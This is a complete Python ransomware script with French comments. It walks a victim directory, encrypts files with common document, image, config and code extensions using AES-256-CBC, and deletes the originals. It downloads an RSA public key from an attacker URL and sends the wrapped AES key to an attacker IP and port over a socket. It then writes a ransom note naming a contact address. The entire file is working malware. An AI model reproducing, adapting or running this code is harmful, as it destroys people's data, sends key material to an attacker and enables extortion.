#!/usr/bin/env python3
"""
ransom.py — Chiffre les fichiers d'un dossier (à lancer sur la TARGET)
Usage: python3 ransom.py <dossier> <url_public_pem> <attacker_ip:port>

Exemple:
  python3 ransom.py /home/victim http://192.168.1.1:8080/public.pem 192.168.1.1:9999
"""

import sys
import os
import urllib.request
import socket
import json
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding

# ── Extensions ciblées ────────────────────────────────────────────────────────
TARGET_EXTENSIONS = {
    ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx",
    ".jpg", ".jpeg", ".png", ".zip", ".py", ".sh",
    ".conf", ".cfg", ".log", ".csv", ".json", ".xml",
}

RANSOM_NOTE = """
╔══════════════════════════════════════════════════════╗
║              ⚠  VOS FICHIERS ONT ÉTÉ CHIFFRÉS  ⚠   ║
╠══════════════════════════════════════════════════════╣
║                                                      ║
║  Tous vos fichiers importants ont été chiffrés       ║
║  avec AES-256-CBC + RSA-2048.                        ║
║                                                      ║
║  Pour récupérer vos fichiers, contactez :            ║
║  attacker@darkweb.onion                              ║
║                                                      ║
║  Votre ID : {victim_id}               ║
║                                                      ║
║  Ne supprimez pas les fichiers .enc !                ║
╚══════════════════════════════════════════════════════╝
"""

# ── Chargement de la clé publique RSA ─────────────────────────────────────────
def load_public_key(url):
    print(f"[*] Récupération de public.pem depuis {url}...")
    with urllib.request.urlopen(url, timeout=10) as r:
        pub_pem = r.read()
    key = serialization.load_pem_public_key(pub_pem)
    print("[+] Clé publique chargée")
    return key

# ── Chiffrement AES-256-CBC d'un fichier ──────────────────────────────────────
def encrypt_file(path, aes_key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    padder = sym_padding.PKCS7(128).padder()

    with open(path, "rb") as f:
        data = f.read()

    padded = padder.update(data) + padder.finalize()
    encrypted = encryptor.update(padded) + encryptor.finalize()

    # Format : [16 bytes IV][ciphertext]
    enc_path = path + ".enc"
    with open(enc_path, "wb") as f:
        f.write(iv + encrypted)

    os.remove(path)  # supprime l'original
    return enc_path

# ── Chiffrement de la clé AES avec RSA ────────────────────────────────────────
def encrypt_aes_key(aes_key, public_key):
    return public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        )
    )

# ── Exfiltration de la clé chiffrée vers l'attaquant ─────────────────────────
def exfil_key(encrypted_key, victim_id, attacker):
    host, port = attacker.rsplit(":", 1)
    payload = json.dumps({
        "victim_id": victim_id,
        "encrypted_aes_key": encrypted_key.hex(),
    }).encode()
    try:
        s = socket.socket()
        s.connect((host, int(port)))
        s.sendall(payload + b"\n")
        s.close()
        print(f"[+] Clé AES chiffrée exfiltrée vers {attacker}")
    except Exception as e:
        # Fallback : sauvegarde locale si pas de connexion
        fallback = f"encrypted_key_{victim_id}.txt"
        with open(fallback, "w") as f:
            f.write(encrypted_key.hex())
        print(f"[!] Exfil échouée ({e}), clé sauvée localement : {fallback}")

# ── Scan et chiffrement du dossier ────────────────────────────────────────────
def encrypt_directory(directory, aes_key):
    encrypted = []
    skipped = []
    for root, _, files in os.walk(directory):
        for fname in files:
            if fname.endswith(".enc"):
                continue
            ext = os.path.splitext(fname)[1].lower()
            if ext not in TARGET_EXTENSIONS:
                skipped.append(fname)
                continue
            full_path = os.path.join(root, fname)
            try:
                enc_path = encrypt_file(full_path, aes_key)
                encrypted.append(enc_path)
                print(f"  [+] {full_path} → {os.path.basename(enc_path)}")
            except Exception as e:
                print(f"  [!] Skipped {full_path}: {e}")
    return encrypted

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <dossier> <url_public_pem> <attacker_ip:port>")
        print(f"Ex:    {sys.argv[0]} /home/victim http://10.0.0.1:8080/public.pem 10.0.0.1:9999")
        sys.exit(1)

    directory    = sys.argv[1]
    pubkey_url   = sys.argv[2]
    attacker     = sys.argv[3]
    victim_id    = os.urandom(4).hex().upper()

    if not os.path.isdir(directory):
        print(f"[!] Dossier introuvable : {directory}")
        sys.exit(1)

    # 1. Charger la clé publique RSA
    public_key = load_public_key(pubkey_url)

    # 2. Générer une clé AES-256 aléatoire
    aes_key = os.urandom(32)
    print(f"[*] Clé AES-256 générée")

    # 3. Chiffrer les fichiers
    print(f"[*] Chiffrement de {directory}...")
    encrypted_files = encrypt_directory(directory, aes_key)
    print(f"[+] {len(encrypted_files)} fichier(s) chiffré(s)")

    # 4. Chiffrer la clé AES avec RSA
    encrypted_aes_key = encrypt_aes_key(aes_key, public_key)

    # 5. Exfiltrer la clé vers l'attaquant
    exfil_key(encrypted_aes_key, victim_id, attacker)

    # 6. Note de rançon
    note = RANSOM_NOTE.format(victim_id=victim_id)
    note_path = os.path.join(directory, "README_DECRYPT.txt")
    with open(note_path, "w") as f:
        f.write(note)
    print(f"[+] Note de rançon : {note_path}")
    print(note)

if __name__ == "__main__":
    main()
